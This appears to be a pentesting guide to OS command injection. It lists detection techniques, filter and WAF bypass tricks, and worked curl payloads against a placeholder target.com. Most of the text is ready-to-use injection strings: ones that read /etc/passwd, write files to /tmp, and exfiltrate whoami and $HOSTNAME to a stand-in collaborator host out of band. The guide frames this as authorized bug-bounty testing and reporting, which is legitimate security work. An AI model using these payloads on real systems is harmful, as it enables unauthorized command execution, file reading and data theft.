# HOW TO TEST OS COMMAND INJECTION ON A TARGET (2026 expert guide)
> **Author:** MD MAHABUBUR RAHMAN
Searcher that accepts a value passed to shell (ping, convert, zip, bash, ffmpeg, CWD args).

## The N ways to test
1. Detection via time: ping -c 10 127.0.0.1 / sleep 5 / %0apython SLEEP.
2. Detection via DNS: payload that resolves YOUR-COLLABORATOR (OOB, no output needed).
3. Detection via output: ;id, |id, $(id), `id`, %0Aid%0A.
4. Context split: quote breakers (', ", backslash) + operator placement.
5. Blind: file-write canary /tmp/w1, then fetch (works with output disabled).
6. Exfil: base64 the out to collaborator (curl /bin/bash -c ...).
7. Multiline: newline (cmd on new line) vs inline &. Web SSE.
8. Weak input paths: filename, path, hostname, port, url, ip fields.

## Bypass ladder (for filters)
- Space -> ${IFS}, $'\t', %09, ${IFS:0:1}.
- Slash -> ${PATH:0:1}, hex `\x2f`.
- Keywords -> c\'a\'t, c"a"t, base64 -d, tr/hex/xxd obfuscation, brace {cat,/etc/passwd}.
- Quotes -> no-ops instead: $(< /etc/passwd) / cat /etc/passw[d]...
- The %0d%0a line-inject where a raw newline is deleted by a WAF.

## Step-by-step on target (safe first)
1. Enumerate the param (hostname, ping, ip, domain in some tool-feature).
2. Time-delay probe (safe, no output):  127.0.0.1;sleep 5     | wait 5+ sec in response.
3. Output-probe:  127.0.0.1;id    -> look for uid=.
4. OOB confirm:  127.0.0.1;nslookup YOUR-COLLABORATOR   (dig dnslog).
5. Blind carve:  127.0.0.1;echo PWNED > /tmp/pwn    then request other endpoint if it serves /tmp.

## Worked examples (concrete)
time-delay (blind, safe):
```
curl -i "https://target.com/ping?host=127.0.0.1;sleep+5"     # measure total time
curl -i "https://target.com/ping?host=`ping+-c+10+127.0.0.1`"
output read:
curl -i "https://target.com/ping?host=127.0.0.1;id"
curl -i "https://target.com/ping?host=127.0.0.1|whoami"
curl -i "https://target.com/ping?host=127.0.0.1%0aid"
curl -i "https://target.com/ping?host=127.0.0.1$(cat+/etc/passwd)"
OOB (no output channel):
curl -i "https://target.com/ping?host=127.0.0.1;curl+`whoami`.YOUR-COLLABORATOR.oast.fun"
curl -i "https://target.com/ping?host=\${IFS}`curl+http://YOUR-COLLABORATOR/?x=\$HOSTNAME`"
file read via blind carve:
curl -i "https://target.com/ping?host=127.0.0.1;cat+/etc/passwd>+/tmp/pwn"
then find any endpoint that returns /tmp/pwn content.
WAF-bypass read with no spaces:
curl -i "https://target.com/ping?host=127.0.0.1;cat\${IFS}/etc/passwd"
curl -i "https://target.com/ping?host=127.0.0.1;{cat,/etc/passwd}"
curl -i "https://target.com/ping?host=127.0.0.1;c'a't+<+/etc/passwd"
```

## False positives
- App echoes the command but never executes (only shows string) - need execution evidence (time/output).
- ';sleep 5' returning instantly = no injection (framework does its own arg handling).

## Reporting
- Delay 5s = Medium; data/file read = High; RCE (write webshell/rev) = Critical.
- Always include the exact request + a timing/response table.
